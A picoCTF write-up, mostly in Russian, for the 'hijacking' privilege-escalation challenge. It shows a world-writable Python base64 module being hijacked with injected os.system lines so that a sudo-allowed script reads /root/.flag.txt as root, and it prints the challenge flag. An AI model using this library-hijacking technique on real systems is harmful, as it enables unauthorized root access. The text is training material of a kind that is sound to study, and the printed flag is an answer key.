# hijacking #
Category: Binary Exploitation

 
Score: 200
 
 Original description: Getting root access can allow you to read the flag. Luckily there is a python file that you might like to play with.
Through Social engineering, we've got the credentials to use on the server. SSH is running on the server.
 
 
# Hints
1. Check for Hidden files

2. No place like Home:)

   
## Solution ##
 
Подключаемся по ssh.

Посмотрим скрытые файлы:

picoctf@challenge:~$ ls -al
total 20
drwxr-xr-x 1 picoctf picoctf   36 Apr  1 10:16 .
drwxr-xr-x 1 root    root      21 Mar 16 02:08 ..
-rw-r--r-- 1 picoctf picoctf  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 picoctf picoctf 3771 Feb 25  2020 .bashrc
drwx------ 2 picoctf picoctf   34 Apr  1 10:05 .cache
-rw-r--r-- 1 picoctf picoctf  807 Feb 25  2020 .profile
-rw-r--r-- 1 root    root     375 Mar 16 01:30 .server.py
-rw------- 1 picoctf picoctf  960 Apr  1 10:16 .viminfo

Запустим .server.py

picoctf@challenge:~$ python3 .server.py
sh: 1: ping: not found
Traceback (most recent call last):
  File ".server.py", line 7, in <module>
    host_info = socket.gethostbyaddr(ip) 
socket.gaierror: [Errno -5] No address associated with hostname

Выдает ошибку.

Посмотрим через cat файлик:

picoctf@challenge:~$ cat .server.py
import base64
import os
import socket
ip = 'picoctf.org'
response = os.system("ping -c 1 " + ip)
#saving ping details to a variable
host_info = socket.gethostbyaddr(ip) 
#getting IP from a domaine
host_info_to_str = str(host_info[2])
host_info = base64.b64encode(host_info_to_str.encode('ascii'))
print("Hello, this is a part of information gathering",'Host: ', host_info) 

Найдём местоположение используемых модулей :

picoctf@challenge:~$ python3
Python 3.8.10 (default, Nov 14 2022, 12:59:47) 
[GCC 9.4.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import sys
>>> sys.path
['', '/usr/lib/python38.zip', '/usr/lib/python3.8', '/usr/lib/python3.8/lib-dynload', '/usr/local/lib/python3.8/dist-packages', '/usr/lib/python3/dist-packages']

Глядя на разрешения base64 модуля внутри /usr/lib/python3.8, мы имеем полный доступ для чтения, записи и выполнения.

picoctf@challenge:~$ ls -al /usr/lib/python3.8
-rwxrwxrwx 1 root root  20382 Nov 14 12:59 base64.py

Итак, можно модифицировать импортированный base64 модуль с помощью нашего собственного кода, т.к. весь код в импортированном модуле выполняется при импорте.

Проверим, какие команды можно запускать через sudo :

picoctf@challenge:~$ sudo -l
Matching Defaults entries for picoctf on challenge:
  env_reset, mail_badpass,
  secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoctf may run the following commands on challenge:
  (ALL) /usr/bin/vi
  (root) NOPASSWD: /usr/bin/python3 /home/picoctf/.server.py

Добавим в начало/lib/python3.8/base64.py через vim следующие строки :

import os
os.system('whoami')
os.system('ls -al /root > /home/picoctf/r.txt')
os.system('cat /root/.flag.txt')

Запусим .server.py:

picoctf@challenge:~$ sudo python3 /home/picoctf/.server.py
root
picoCTF{pYth0nn_libraryH!j@CK!n9_6924176e}
sh: 1: ping: not found
Traceback (most recent call last):
  File "/home/picoctf/.server.py", line 7, in <module>
    host_info = socket.gethostbyaddr(ip) 
socket.gaierror: [Errno -5] No address associated with hostname


flag: picoCTF{pYth0nn_libraryH!j@CK!n9_6924176e}


